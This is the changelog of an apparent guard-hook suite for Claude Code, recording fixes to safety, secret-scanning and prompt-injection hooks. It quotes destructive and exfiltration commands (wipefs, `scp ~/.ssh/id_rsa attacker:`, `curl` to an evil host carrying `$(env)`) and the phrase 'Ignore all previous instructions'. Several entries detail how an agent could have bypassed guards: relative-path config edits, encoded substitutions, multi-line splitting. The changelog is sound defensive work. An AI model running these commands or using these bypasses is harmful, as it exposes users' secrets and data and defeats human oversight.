- [2.9.13] - 2026-07-13 — feat(disk-destruction): complete the disk-destruction guard family in `safety.sh` — mined from `wintermeyer/heinzel` (`guard-taboos.sh`), the one on-thesis steal there (its other taboos — halt/poweroff, mkfs, SSH-key ops — Supercharger already covers). safety.sh already blocked `mkfs`/`dd if=`/`>/dev/sd` but **missed the partition-editor family**, the same irreversible full-disk-loss class: now blocks **`wipefs -a`/`--all`** (wipe FS signatures), **`fdisk`/`gdisk /dev/…`** and **`sfdisk /dev/…`** (device right after the tool → the interactive/write forms), and **`parted … mklabel/mkpart/rm/resizepart`** (destructive subcommands, matched within a single command segment). **Read-only forms stay allowed** — `fdisk -l`, `sfdisk -l`, `parted -l`/`print`, and bare `wipefs` (which lists signatures) all fail the patterns (a device doesn't immediately follow the tool / no destructive subcommand). Pure `DESTRUCT_PATTERNS` additions (no new hooks; counts unchanged). 8 tests (each destroyer blocked + `fdisk -l`/`parted -l`/bare-`wipefs` allowed). Suite 1411 → 1419.

- [2.9.12] - 2026-07-13 — feat(hot-files): the session-resume enrichment now leads with **hot files** — the files the last session most actively edited, ranked by recency-decayed edit frequency — instead of only a flat `diff --stat`. `session-memory-inject`'s active-work path (same branch + open work) computes the ranking from `audit-trail`'s existing Write/Edit entries (keys `tool`/`file`/`timestamp`) — **no new tracking hook**: it scans the 2 most-recent daily audit JSONLs, keeps edits < 48h old under the project's git root, scores each file `Σ max(0.15, 1 − age_h/48)`, and appends the top 4 basenames as `hot:a.ts,b.ts,…`. So a resumed/compacted session sees *what we were working on*, not just *what changed on disk*. Idea adapted from `thebrain`'s "file heat" — deliberately as a **memory/prioritization signal, not a guard** (Supercharger's thesis is blocking bad actions; heat ranks, it doesn't block), and reusing the audit log rather than porting thebrain's Node.js subsystem. Only fires in the active-work path; empty/failed scan → silent (existing enrichment unchanged). 1 test (3× `hot.ts` + 1× `cold.ts` → `hot:hot.ts` first). Suite 1410 → 1411; no new hooks (count unchanged).

- [2.9.11] - 2026-07-13 — feat(commit-coauthor-guard): **opt-in** (default OFF) hook that blocks `git commit` when the message carries a `Co-Authored-By:` trailer — the "Co-Authored-By: Claude …" AI-attribution line — for devs who don't want AI attribution in their git history/`blame`. Mined from `domengabrovsek/claude` (`pre-commit-coauthor-gate.sh`), the one on-thesis steal there (its `pre-commit-branch-gate` — block commits on main — was rejected: it'd break a solo-on-master workflow like Supercharger's own; its `pre-push-gate` — block push until lint/test/build pass — is the ECC quality-gate lane already declined, blocking + heavy-latency vs Supercharger's deliberately-advisory `stop-verify`). New **`commit-coauthor-guard.sh`** (PreToolUse|Bash): matches `git commit` (leaves `--help`/`-h` alone), greps the command for a `co-authored-by:` trailer (any case, covers `-m` and inline heredocs), denies on match — reason names the fix, disable is one line. Enable per-machine with `touch ~/.claude/supercharger/scope/.coauthor-guard` or per-session with `SUPERCHARGER_COAUTHOR_GUARD=1` (`=0` force-disables even if the flag file exists). Fail-open. Full-mode only; full install count 110 → 111. 10 tests (blocked on/off/flag-file/env-override, case-insensitive, clean-commit + non-commit + `--help` ignored, malformed-JSON fail-open). Suite 1399 → 1410.

- [2.9.10] - 2026-07-13 — feat(wallet-keys): two more crypto private-key formats in the shared `lib-secret-patterns.sh`, from a re-check of `dwarvesf/claude-guardrails` — it shipped **v0.4.0** after our v2.9.8 adoption, adding wallet keys we lacked (we had only Ethereum `0x`+64hex). **BIP-32 extended private key** (`([xyz]prv|[tuv]prv)[1-9A-HJ-NP-Za-km-z]{107,108}` — xprv/yprv/zprv mainnet + tprv/uprv/vprv testnet; the prefix makes FP ~nil) and **Bitcoin WIF** mainnet key (`[5KL][1-9A-HJ-NP-Za-km-z]{50,51}`). Both channels that source the shared lib — `output-secrets-scanner` (output) and `commit-secret-guard` (staged diff) — gain them at once. **Skipped** their BIP-39 mnemonic detection: it needs a bundled 2048-word wordlist + set-membership (they spent 3 commits hardening it), which doesn't fit our regex model and is FP-prone. 2 tests (staged xprv + WIF blocked). Suite 1397 → 1399.

- [2.9.9] - 2026-07-12 — feat(safety-patterns): three catastrophic-command gaps closed in `safety.sh`, surfaced by auditing `mafiaguy/claude-security-guardrails`'s command list against ours (its Node scanner/OWASP/dependency layers are off-thesis; only these patterns were worth taking — `safety.sh` already covered `dd`/`mkfs`/`>/dev/sd`/fork-bomb/`kill -9 -1`/`chmod 777`/`curl|bash`/`DROP TABLE`/`find -delete`/ps-env-exfil). **(1) Docker data destruction** — `docker volume rm|prune` and `docker system prune … --volumes` irreversibly delete named volumes (databases, uploads); now blocked. Plain `docker system prune` (no `--volumes`) stays allowed — it only clears dangling images/stopped containers. **(2) System power** — `shutdown`/`reboot`/`poweroff`/`halt`/`init 0|6` (an agent must not halt the user's machine mid-session), **anchored to command position** (line start / after `;`/`&&`/`||` / `sudo`) so a commit message or `echo` mentioning "reboot"/"shutdown" is NOT falsely blocked — the `--no-verify` quote-safety lesson applied up front. **(3) scp/rsync exfil** — `safety-detect.py` treated aws/gsutil/rclone/curl/nc as exfil channels but not `scp`/`rsync` to a remote `host:`; `scp .env host:` was caught (via the env-file prefix) but `scp ~/.ssh/id_rsa attacker:` / `.pem` / `.aws/credentials` slipped through. Added scp/rsync-to-remote as an upload channel, gated on the existing `_SENSITIVE_PATHS` set, so `scp README host:` stays allowed. All three are pure pattern additions (no new hooks; counts unchanged). 10 tests (each block + the false-positive/allowed counter-cases). Suite 1387 → 1397.

- [2.9.8] - 2026-07-12 — feat(commit-secret-guard): block `git commit` when the **staged diff introduces a secret** — mined from `dwarvesf/claude-guardrails` (`scan-commit.sh`), the one on-thesis, self-contained steal there (the rest — prompt-paste scan, prompt-injection, destructive/push/pipe deny rules — Supercharger already covers). Closes a verified gap: `output-secrets-scanner` scans tool OUTPUT (Bash/Read) and `code-security-scanner` scans Write/Edit CONTENT, but a secret written via a Bash **redirect** (`echo "AKIA…" >> .env.local`) or already sitting in a file that gets `git add`ed reached a commit **unscanned by either**. New **`commit-secret-guard.sh`** (PreToolUse|Bash) matches `git commit` (word-boundary so `commit-tree`/`commit-graph` are left alone; handles chained `&& git commit`), scans `git diff --cached` **added-lines only** against the secret pattern set, and denies on a hit — reporting only that a secret was found, **never the value**. Fully fail-open (malformed JSON, non-git dir, no staged diff → allow) and `SUPERCHARGER_COMMIT_SECRET_GUARD=0` to disable. **Anti-drift refactor:** rather than duplicate ~20 secret regexes into a second hook (the [[cross-channel-parity-drift]] bug class), the patterns moved to a shared **`lib-secret-patterns.sh`** now sourced by BOTH `output-secrets-scanner.sh` and the new guard — one list, both channels, no divergence. Also **added an Ethereum/EVM wallet-key pattern** (`0x`+64hex — the `0x` prefix keeps it distinct from a bare SHA-256 checksum, low FP), which both channels gain for free. Full-mode only (grouped with `git-safety`); full install count 109 → 110. 12 tests (staged AWS/private-key/eth-key blocked; clean diff, unstaged secret, non-commit, `commit-tree`, chained, disabled, malformed, non-git-dir all handled); `output-secrets-scanner` refactor verified by the existing liveness suite. Suite 1374 → 1387.

- [2.9.7] - 2026-07-12 — feat(explorer-agent): a read-only code-exploration subagent — **Ferdinand Magellan (Navigator)** (`configs/agents/explorer.md`), Supercharger's analog of Claude Code's built-in `Explore`. Fills a real gap in the 9-agent suite: none was a breadth-first *locate & map* agent (researcher answers questions, reviewer critiques, architect designs — none just finds where code lives). Tools are read-only (`Read, Glob, Grep, Bash` — no Write/Edit); it fans out across the tree, reads *excerpts* not whole files, and returns the **map** (direct answer + grouped `file:line` references + explicit coverage gaps) rather than a pile of files — with hard rules to locate-not-judge (quality/bugs escalate to the reviewer) and to state which search forms it ran. Runs on the sonnet throughput tier (fast/cheap for frequent fan-out), matching the execution-agent model policy. `agent-router.sh` now routes code-location prompts ("where is X", "which file", "find every caller of", "locate", "trace", "how is X implemented/wired", "explore/search the codebase") to it, ordered before the generic engineer catch-all so "find every caller" maps to exploration, not implementation. Auto-deployed by install (agents are copied by glob; the install count is dynamic). 8 tests (2 router: where-is + find-callers → Magellan; 6 agent-format/model-tier via the validator's expected-agents list) + an install deploy assertion. Suite 1366 → 1374.

- [2.9.6] - 2026-07-12 — feat(3-hooks): three enforcement hooks, mined from a scan of the ECC harness (`affaan-m/ECC`) against Supercharger's catalog — the only on-thesis, portable, non-duplicate steals from ~46 of its hooks. **(1) git hook-bypass block** (extends `git-safety.sh`): an agent must not skip the repo's pre-commit/pre-push verification. Now blocks `git commit --no-verify` / `-n` (and bundled `-nm`), `git push --no-verify`, and the sneakier `-c core.hooksPath=<x>` inline-config override that disables ALL git hooks (case-insensitive). Flags are matched on a **quote-stripped** copy of the command so a commit *message* mentioning `--no-verify` isn't falsely blocked; `git push -n` (`--dry-run`, harmless) is deliberately allowed. Directly serves the "verify before committing" thesis — closes a real gap (Supercharger had zero `--no-verify` coverage). 10 tests. **(2) `fact-gate.sh`** — new **opt-in** (`SUPERCHARGER_FACT_GATE=1`, default OFF) PreToolUse first-touch investigation gate: on the first edit of a given file in a session it denies **once**, demanding Claude state who imports/calls the file, the APIs/schemas touched, and the user's verbatim instruction — then the retry proceeds. sha-keyed per-session markers, 30-min TTL, control-file exempt, fully fail-open. A distinct enforcement class from `confidence-gate` (probabilistic score) and `human-approval-gate` (asks the user) — this forces investigation before a blind edit. 11 tests. **(3) `mcp-circuit-breaker.sh`** — reactive breaker for MCP servers (default ON, fail-open): PostToolUse trips a per-server breaker when a response shows 429/503/401/403/rate-limit/overloaded (escalating cooldown, capped); PreToolUse then denies further calls to *that* server until the cooldown expires; a clean success resets it. Stops Claude burning turns hammering a throttled/down server — a gap in the existing 6 mcp-* guards (all security/output, none availability). 11 tests. Both new hooks are **full-mode only** (safe mode stays pure core-enforcement); full-mode install count 106 → 109 (fact-gate + mcp-breaker ×2 events), distinct scripts 103 → 105. `docs/HOOKS.md` regenerated. Suite 1332 → 1366. Rejected from ECC (already covered or off-thesis/dep-locked): config-protection (=path-guard), pre-compact & insaits-security (network/paid pip), commit-quality/governance, console-log/doc-warn/tmux/dev-server ceremony, design-quality linting, language-standard rules.

- [2.9.5] - 2026-07-12 — fix(install-count): the install banner ("N hook(s) installed") counted event *registrations*, not hooks — a single hook bound to several events (e.g. `notify` on 3 `Notification` events, `subagent-cost` on Start+Stop) was tallied once per binding, overstating the number and diverging from the distinct-script count in `docs/HOOKS.md`. `count_installed_hooks` now dedups by hook-script basename (tuple field 3) via portable awk (no `length(array)` — BWK/macOS awk lacks it; counts keys with a `for-in` loop), so full mode reports 103 distinct scripts instead of 107 registrations. Banner-only — `settings.json` still registers every binding, and `test-install`'s registration-count assertions are unchanged (they read `settings.json`, not this function). +1 regression test (deduped count is >0 and strictly < raw tuple count). Suite 1331 → 1332.

- [2.9.4] - 2026-07-12 — feat(file-lease): advisory concurrent-session write guard — the collision half of the `scope-file-session-scoping` bug class that per-session state scoping never covered. Supercharger already keys its OWN state files per session, but nothing guarded two *live Claude sessions editing the same project file* — a silent lost-update: session B overwrites session A's edits with no signal to either. New **`file-lease.sh`** (PreToolUse `Write,Edit,MultiEdit,NotebookEdit`): on each edit it records the caller as the lease-holder for that file (`scope/.file-leases/<sha256(abspath)[:32]>` = `session_id<TAB>ts`, atomic `os.replace`); if a *different* session holds a lease younger than the TTL (`SUPERCHARGER_FILE_LEASE_TTL`, default 900s), the caller gets a non-blocking `[LEASE]` `additionalContext` warning ("X is being edited by another active Claude session … consider waiting or editing a different file"). Deliberately **advisory — never denies** (fail-safe): the model decides. Fully fail-open — missing `session_id`/`file_path`, malformed JSON, or IO error → silent `exit 0`, edit proceeds. TTL expiry means a crashed/ended session never locks a file; `scope-guard.sh` also prunes day-old leases (the lease subdir is below the maxdepth-1 scope sweep). **Full-mode only** (advisory UX, like `notify` — safe mode stays pure enforcement); disable with `SUPERCHARGER_FILE_LEASE=0`. Idea borrowed from the one on-thesis hook in `Chachamaru127/claude-code-harness` (`file_lease_hook.go`) — ported bash-native, single python fork, `PYTHONUTF8`, sha-keyed. 11 tests (first-touch silent, peer conflict warns, self re-edit silent, different-file silent, TTL expiry silent, NotebookEdit via `notebook_path`, 3 fail-open cases, disable switch). Full-mode install count 105 → 106; suite 1319 → 1331 (a forgotten `report` call had been silently undercounting the new file by 11 in `run.sh`'s per-file total aggregation — fixed). `docs/HOOKS.md` regenerated (also caught up several previously-unregenerated rows).

- [2.9.3] - 2026-07-09 — feat(cc-updates): two upstream-Claude-Code alignments. **(1) NotebookEdit/MultiEdit guard coverage** — `path-guard`, `code-security-scanner`, and `confidence-gate` matched only `Write,Edit`, so an out-of-project write, a secret, or a blind edit routed through `NotebookEdit` (or `MultiEdit`) slipped past all three — a real bypass gap as notebooks became first-class. Widened the `lib/hooks.sh` matchers to `Write,Edit,MultiEdit,NotebookEdit`, fixed each hook's internal tool-name gate (matcher change alone was insufficient — path-guard's `case` still fell through), and taught the field readers the notebook shapes (`notebook_path`, `new_source`). +3 path-guard tests (NotebookEdit/MultiEdit outside project blocked; in-project allowed) → 29. **(2) Fable/Mythos-5 pricing** — the cost hooks (`budget-cap`, `subagent-cost`) and `/sc-status` had no Fable tier, so Fable runs were priced as Sonnet — ~3× under-counted, an under-count that defeats the budget cap. Added `'fable': (10.00, 12.50, 1.00, 50.00)` (= 2× Opus) plus `'fable'/'mythos'` model detection across all three. Research over-stated the gap: `PostToolUseFailure` and `SubagentStart` were already adopted; the `if`-conditional matcher field was dropped (marginal perf vs. silent coverage-loss risk).

- [2.9.2] - 2026-07-07 — fix(toggle): the statusline kept rendering when `/sc off` was active — so it didn't genuinely look like vanilla Claude. The statusline is a settings.json `statusLine` command (not a hook), and `statusline.sh` didn't source the shared libs, so the v2.9.0 kill-switch never reached it. Added the same flag check at the top of `statusline.sh`: when deactivated it exits before reading stdin → blank status bar, immediately (statusLine re-runs each turn), no settings.json surgery needed. `/sc on` brings it back on the next render. Now `/sc off` is genuinely vanilla — no guards, no injection, AND no statusline. 2 tests (blank when off; guard present + inert when on).

- [2.9.1] - 2026-07-07 — docs(discoverability): surface the `/sc off|on` toggle where people actually look. The install summary now prints "Want plain Claude for a bit? /sc off … /sc on …", and — the higher-value one — the **uninstaller offers `/sc off` as an alternative BEFORE the confirm prompt** ("Just want to pause Supercharger, not remove it? Run /sc off instead …"), so someone about to uninstall over an annoying guard learns they can just deactivate. Also added it to the README install block and FAQ. No behavior change beyond the printed hints (shellcheck-covered).

- [2.9.0] - 2026-07-07 — feat(toggle): `/sc off | on | status` — a global activate/deactivate switch to flip between Supercharger and plain default Claude Code on demand, without uninstalling. Requested by users who want the vanilla experience for a task, or to A/B compare. **`/sc off`** writes a kill-switch flag (`scope/.supercharger-disabled`) that `lib-suppress.sh` and `lib-timing.sh` check at source-time — so EVERY hook (all 94, incl. the security guards, which source lib-timing) exits immediately on its next fire: no enforcement, no context injection, no statusline, stock Claude. It also backs up (`~/.claude/backups/deactivate-<ts>/`) and strips the Supercharger block from `~/.claude/CLAUDE.md` (handles both merge installs — keeps your own content above the marker — and whole-file deploy installs), so the prompt layer is gone next session. **`/sc on`** removes the flag and restores the exact CLAUDE.md. Deliberately does NOT touch `settings.json` (no JSON surgery / no blast radius) and deletes nothing — files stay dormant on disk. Bootstrap-safe: the toggle tool exports `SUPERCHARGER_TOGGLE=1` to bypass its own kill-switch, so `/sc on` is always reachable; `create_backup` runs before any change. `/sc off` prints a loud "all guards inactive" warning (there's no statusline while off — Supercharger genuinely isn't running — so `/sc status` reports state). 14 tests (off/on/status, both libs early-exit, toggle-bypass anti-bootstrap-trap, merge + deploy CLAUDE.md strip/byte-exact-restore, idempotency, backup). Minor bump — first new headline feature since the 2.8.0 security milestone.

- [2.8.14] - 2026-07-07 — fix(scope-leak): `.read-history` was the last per-session file stored GLOBAL — the [[scope-file-session-scoping]] class the project fixed for `.tool-history`/`.repetition-flag`/etc., but this one was missed. `repetition-detector.sh` wrote every Read to `$SCOPE_DIR/.read-history` (no `-<sid>`) and `confidence-gate.sh` read it for the **read-before-write** check (which can DENY an Edit — score <0.4 → permissionDecision:deny, false rbw contributes −0.30). Because it was global, reads from EVERY past session and project accumulated forever, so (a) confidence-gate's read-before-write signal silently stopped firing on real blind edits — a stale read of the same path from any prior session satisfied it — degrading a safety check, and (b) fresh sessions got false "[TOKEN TIP] you already read X" hints for files they never read. Now keyed `.read-history-<sid>` in both the writer and reader (identical session_id sanitization, so filenames match), with scope-cleanup's TTL glob widened to `.read-history*` to prune both the per-session files and the orphaned global one. Found by a deliberate weakness-hunting research pass (fail-open, advisory-signal-accuracy, scope-leak); this was the actionable finding. 1 regression test (a file recorded only in the global file no longer satisfies rbw → conf:0.30, not the leaked 0.60); 6 pre-existing test setups updated to the session-scoped filename.

- [2.8.13] - 2026-07-07 — fix(signal): thinking-budget mislabelled terse/continuation prompts as "trivial → minimal reasoning". A different optimization dimension — *signal accuracy*, not latency. Observed live: bare "go" / "okay" / "next" / "yes" (and any ≤3-word non-question prompt) were classified `low`, injecting `[THINK] Trivial task. Respond directly, minimal reasoning.` — but those prompts almost always CONTINUE in-flight work that may be complex, so the hint actively pushed the model to under-think. Worse, terse high-stakes commands ("delete prod", "deploy now") were also labelled trivial. Root: (1) `low_verbs` treated bare acknowledgments as a triviality signal; (2) a `len(words) <= 3` fallback made shortness alone → trivial; (3) the DEFAULT `generalist` agent forced `low`. Fixed so `low` requires a POSITIVE read-only/display verb (read/show/list/cat/print/ls/view/display) — ambiguous/terse prompts now get NO hint (→ medium) rather than a wrong one, and genuine read-only prompts still classify trivial, complex prompts still classify `high`. A wrong reasoning-depth hint is worse than none. 7 regression tests (go/okay/next/yes/continue + delete-prod get no trivial hint; read-only verb still trivial); 2 pre-existing tests updated from the now-invalid 'yes'→low assumption.

- [2.8.12] - 2026-07-07 — perf(hot-path): cut fork overhead in cmd-normalize.sh, the helper sourced by safety.sh / git-safety.sh / enforce-pkg-manager.sh on EVERY Bash tool call. Measured ~443ms of hook latency per Bash call on macOS bash 3.2 (no cheap EPOCHREALTIME clock), concentrated here. Two changes: (1) `normalize_cmd` rewritten from 4×sed + 1×tr (~9.7ms of forks/call) to pure-bash parameter expansion — trim, leading-backslash strip, and space-collapse now fork-free; behavior-identical (bash-specific expansions run under the hooks' `#!/usr/bin/env bash`, verified by the full suite). (2) `split_segments` gained a fork-free fast-path: the ~31ms python3 fork only runs when the command actually contains a shell separator (`&& || ; |`); separator-free commands (npm test, git status, cat x — the majority) take a pure-bash single-segment path that mirrors the python's strip()+prefix-strip order. Any separator char anywhere (even inside quotes) still routes to the quote-aware python splitter, so a quoted separator can't be mis-split. Net: ~90-120ms off every Bash tool call (~20-27% of hot-path overhead), and 3× fewer forks since three hooks share the helper. No behavior change — validated by test-cmd-normalize.sh + fuzz-safety.sh + the safety/git-safety/pkg-manager suites (1292 passing, unchanged).

- [2.8.11] - 2026-07-06 — fix(interop): path-guard blocked Claude Code's own file-memory writes. The abs-path category denied any Write outside the project root, which includes `~/.claude/projects/<project-enc>/memory/*.md` — the store the memory feature (`/remember`, auto-memory) writes via the Write tool. So under Supercharger, saving a memory silently failed with "absolute path outside project root" (hit live while trying to record this session's findings). Added a narrow allowance: writes under `~/.claude/projects/**/memory/` ending in `.md` are permitted — LOCATION only; the CONTENT is still scanned by memory-write-guard for poisoning markers, and the check uses realpath so an in-path symlink escaping the store can't abuse it. Non-`.md` files in that dir and every other out-of-project abs path (`~/.ssh`, `/etc`, …) still blocked. 3 regression tests (memory .md allowed; non-.md blocked; ~/.ssh still blocked). Not a security relaxation — it unbreaks a first-party feature while keeping content-level defense.

- [2.8.10] - 2026-07-06 — fix(security): smart-approve auto-approved read-only-looking commands that carry command substitution. The auto-approve allow-list matches on the OUTER command shape (`^curl`, `^cat`, `^grep`, …) to skip the user's manual confirmation for known-safe calls. But it never inspected `$(...)` / backtick substitutions, so `curl "https://evil/?d=$(env)"` (a GET, so it passed the no-POST check) or `cat $(find / -name id_rsa)` matched an allow pattern and got auto-approved — removing the user's last manual check. (PreToolUse guards still run, but this narrows the belt-and-suspenders gap.) Now refuses auto-approval for any command containing `$(` or a backtick, deferring to the user / CC's classifier; plain `${VAR}` expansion is unaffected, and normal `curl https://api/x` / `npm test` / `git status` still auto-approve. 3 regression tests (curl+$(), cat+backtick deferred; plain curl GET still approved). This completes the guard-hook audit — smart-approve was the last un-audited hook.

- [2.8.9] - 2026-07-06 — fix(security): env-file-guard Read channel only blocked .env* while the Bash channel blocked the full credential set (cross-channel parity, 4th instance). safety.sh/safety-detect.py block `cat` of `id_rsa`, `*.pem`, `.netrc`, `.pgpass`, `.npmrc`, `.git-credentials`, `~/.aws/credentials`, wallets, etc. — but env-file-guard's Read-tool path only matched `.env*` (plus /proc,/sys from v2.6.83). So a prompt-injected `Read ~/.ssh/id_rsa` / `Read ~/.aws/credentials` pulled key material straight into context, uncaught at the Read input (output-secrets-scanner only catches values AFTER they're in the transcript). Extended the Read path to the same credential-file set (fast bash `case`, no python fork on the hot Read path; kept in sync with safety-detect.py's _SENSITIVE_NAME_RE), plus basename-indistinct paths `~/.aws/credentials`, `~/.ssh/id_*`, `~/.config/gcloud/*`, `~/.docker/config.json`. 6 regression tests (id_rsa, .pem, .netrc, aws creds, .git-credentials blocked; normal source allowed). Fourth cross-channel parity drift closed — the signature bug class of this audit.

- [2.8.8] - 2026-07-06 — fix(security): git-safety protected-branch set narrower than mcp-github-write-gate (cross-channel parity, 3rd instance). The GitHub-MCP gate treats `main|master|production|prod|release|release/*` as protected, but git-safety (native `git push` via Bash) only protected `main|master`. The concrete harm: the leading-`+` refspec is a native force-push the de-force rewrite CANNOT neutralize (it strips `--force`/`-f` flags, not the `+`), so `git push origin +production` set `has_force` but not `has_protected` and rewrote to itself — force-pushing production's history away, unblocked. `+main`/`+master` were caught; `+production`/`+prod`/`+release`/`+release/x` slipped. Extended git-safety's leading-`+` protected match to mirror the MCP gate. Word-boundaried so `+prod-config` (a feature branch) is NOT caught, and non-protected `+feature` force-pushes are still allowed by design. 3 regression tests (+production, +release/1.0 blocked; +feature allowed). Third cross-channel/sister-hook parity drift closed this session (whitespace-bypass ×3, path-guard↔safety.sh selfmod, now github-gate↔git-safety branches).

- [2.8.7] - 2026-07-06 — fix(security): complete the safety.sh↔path-guard selfmod parity started in 2.8.6. Closer diff of the two selfmod sets found 2.8.6 still missed two files path-guard blocks: **`~/.claude.json`** (the global config holding the `mcpServers` map — SymJack's target: a Bash redirect inserts an auto-spawning MCP server) and **`.claude/settings.local.json`** (the `.claude/settings\.json` regex didn't match the `.local` variant). Both were still Bash-writable. Pattern now `\.claude/settings(\.local)?\.json` + `\.claude\.json`. Full parity verified against path-guard's target list. 2 more regression tests (`~/.claude.json`, `.claude/settings.local.json`; reads still allowed).

- [2.8.6] - 2026-07-06 — fix(security): safety.sh Bash-channel selfmod was narrower than path-guard's Write/Edit channel. Auditing the consolidated Bash guard (378 lines, the single most important enforcement hook). The `selfmod` category only listed `.claude/settings.json` and `.claude/CLAUDE.md`, but path-guard (the Write/Edit twin) blocks the full guardrail-config set. So the same attack via a *shell redirect* slipped through: `echo '{"disableSecurityCategories":["network"]}' > .supercharger.json`, `echo destructive >> ~/.claude/supercharger/scope/.disabled-security-categories`, or writing project `.mcp.json` — each disables a guard, none was caught. path-guard's own comment claims it "mirrors the Bash-side check in safety.sh selfmod", but the two had drifted (and 2.8.4 widened path-guard while safety.sh stayed narrow). Added `.supercharger.json`, `.mcp.json`, `.disabled-security-categories`, `.disabled-hooks` to the Bash selfmod set; the write-verb gate still lets reads (`cat .supercharger.json`) through. 4 regression tests (3 writes blocked, read allowed). This is the Bash twin of the v2.8.4 path-guard selfmod fix — a core guardrail bypassable from the other tool channel.

- [2.8.5] - 2026-07-06 — fix(security): memory-write-guard multi-line bypass + config-scan Python 3.6 crash. (1) **memory-write-guard** used the same space-delimited injection patterns as prompt-injection-scanner but was NOT given the v2.8.2 whitespace-collapse fix — so a poisoned memory write splitting `Ignore all previous instructions` across newlines (memory files are multi-line markdown, the natural evasion) bypassed it. Since persistent memory auto-loads at every SessionStart, that's a *persistent* compromise. Now collapses whitespace before matching (zero-width + base64 detectors unaffected, as in v2.8.2). (2) **config-scan used `str.removeprefix`** (Python 3.9+) while the project documents 3.6+ — on 3.6-3.8 a matching `ANTHROPIC_*` reference raised `AttributeError`, and under the hook's `2>/dev/null` that killed the whole scan, silently dropping ALL config-scan warnings (CVE checks, foreign-hook detection, etc.). Replaced with a 3.6-safe slice. Added a permanent meta-test that greps hooks/lib for `.removeprefix(`/`.removesuffix(` call forms so a 3.9+ method can't silently reappear. 3 regression tests (multi-line memory block, benign multi-line no-FP, py36-compat guard).

- [2.8.4] - 2026-07-06 — fix(security): path-guard selfmod bypass via relative config paths + encoded command-substitution. Auditing the largest security hook. (1) **Selfmod relative-path bypass** — the project-config check used `p.endswith('/.supercharger.json')` (and the same for `.mcp.json` / `.claude/settings.json`), which REQUIRES a leading slash. A relative top-level write — `file_path: ".supercharger.json"` — matched neither that nor the absolute-only `p == target` check, so the agent could edit its own guardrail config (disable security categories, insert an MCP server) completely unblocked. This is the exact attack selfmod exists to stop. Now matched by basename (single-file configs, any location) + a leading-slash-agnostic regex for `.claude/settings(.local).json`. (2) **CVE-2026-35021 check ran on the raw path** — the `$(`/backtick command-substitution test used `p`, not the URL-decoded `raw` computed just above for traversal, so `%24%28…%29` slipped it. Now checks both. 5 regression tests (relative `.supercharger.json`/`.mcp.json`/`.claude/settings.json`, encoded `$()`, + a no-false-positive `config/app.json`). The relative-path selfmod hole is the serious one — a core guardrail silently bypassable by dropping the leading slash.

- [2.8.3] - 2026-07-06 — fix(security): code-security-scanner coverage gaps + dead code. This is the Write/Edit warn hook (advisory, no block). (1) **Hardcoded-secret patterns only matched double quotes** — `password = 'x'` (Python's default quoting) and `password: "x"` (YAML/JS object literals) both slipped past. Broadened to single/double/backtick quotes and `:` or `=` assignment, with `{3,}` to skip empty stubs; a quote must immediately follow the operator so env reads (`= os.environ[...]`) don't false-positive. Also matches `api-key`/`apikey`, not just `api_key`. (2) **SHA-1** (collision-broken) now flagged alongside MD5. (3) Removed a dead `for … pass` placeholder loop (lines 91-94) left over from a refactor. 3 regression tests (single-quoted password, SHA-1, + a no-false-positive env-var-read check). Warn-only hook, so these are coverage improvements rather than enforcement fixes.

- [2.8.2] - 2026-07-06 — fix(security): two gaps in prompt-injection-scanner (found continuing the MCP audit). (1) **Inert on structured output** — MCP/Read responses often arrive as a list of content blocks or a dict, not a bare string. The scanner ran `NFKC` directly on `output`; on a non-str that raised, and under the hook's `2>/dev/null` the whole python died silently → **the scanner did nothing** for structured payloads. Now coerces list/dict to a string first (`json.dumps`), mirroring what mcp-provenance already did. (2) **Multi-line bypass** — every multi-word pattern used literal spaces, so the canonical `Ignore all previous instructions` split across newlines (exactly how it's embedded in issue bodies / READMEs / fetched web pages) slipped through — the same whitespace-bypass class as the sql-guard `DROP\nTABLE` fix (v2.7.41). Now collapses `\s+`→space before matching (zero-width chars are category Cf, not whitespace, so the ZW-char detector still fires; base64 patterns carry no spaces, unaffected). Applied the same whitespace-collapse to mcp-provenance for its prose tool-chaining heuristic. 4 regression tests (multi-line block, structured-list scan, multi-line provenance, + a benign multi-line no-false-positive).

- [2.8.1] - 2026-07-06 — fix(security): three gaps in the MCP guard hooks (found by audit). (1) **mcp-playwright-guard** blocked only `browser_run_code_unsafe`, not the plain `browser_run_code` — the exact GH #1495 RCE tool the hook's own header documents — because the glob (`*browser_run_code_unsafe*`) was MORE specific than the threat. Broadened to `*browser_run_code*` (still catches the `_unsafe` variant). (2) Same hook's SSRF navigation block listed `https://` for 10.x/192.168.x but the 172.16–31 (RFC1918) entries were `http://`-only, so `https://172.16.x` bypassed; and `172.2*.*` over-matched public `172.200–255`. Rewrote to strip the scheme and match the HOST once (covers http/https/no-scheme uniformly) with bracket ranges `172.1[6-9]|172.2[0-9]|172.3[01]` — closes the https bypass AND stops over-blocking public 172.200+. Also added `0.0.0.0`, `[::1]`, `[::ffff:127.*]` to the localhost set. (3) **mcp-sql-guard** DROP/ALTER object allowlists were incomplete — `DROP ROLE/USER/FUNCTION/SEQUENCE/OWNED/MATERIALIZED VIEW` and `ALTER SYSTEM/ROLE/USER` all slipped past (`ALTER SYSTEM SET` can change Postgres server config, e.g. disable fsync). Extended both lists. mcp-github-write-gate audited clean (no change). 8 regression tests (each previously a bypass, plus a no-false-positive check on `alter_count`/`role_id` column names and public 172.200). Fixes are all broadening/scheme-symmetric → low FP risk.

- [2.8.0] - 2026-07-06 — docs(readme): correct stale hook counts + refresh highlights. Research pass on README found the install-mode hook counts had silently drifted: README claimed Safe=19 / Full=98, but `lib/hooks.sh` actually registers 25 distinct hooks in safe mode and 90 in full (106 registrations across 94 files). Worse, install.sh's own interactive menu said Safe = "5 hooks" — so the safe count was wrong in THREE different values across two files (19 / 5 / actual 25). Corrected README to 25 / 90 and install.sh:193 to 25. Added two "Recent highlights" bullets for this session's security work (precision secret detection — the output scanner now requires an assigned value, not the bare words "API key"; command-output correctness — the /sc-status,/why,/perf,/cache-stats scope-path sweep + CI meta-test). Everything else in the README verified accurate (version, tests=1249, 8 roles, 9 agents, 25 commands). Minor bump to 2.8.0 to mark the v2.7.4x–.75 security/correctness line (elicitation credential guard, scanner cry-wolf fix, trust-mcp normalization, command-audit sweep, per-session isolation) as a settled milestone.

